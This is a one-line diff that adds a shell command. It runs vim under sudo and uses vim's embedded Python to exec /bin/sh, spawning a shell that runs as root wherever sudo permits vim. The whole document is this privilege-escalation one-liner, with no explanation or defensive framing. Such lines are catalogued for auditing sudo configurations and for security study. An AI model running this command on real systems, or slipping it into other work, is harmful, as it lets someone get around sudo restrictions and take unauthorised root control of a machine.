@@ -1,0 +1,1 @@
+sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
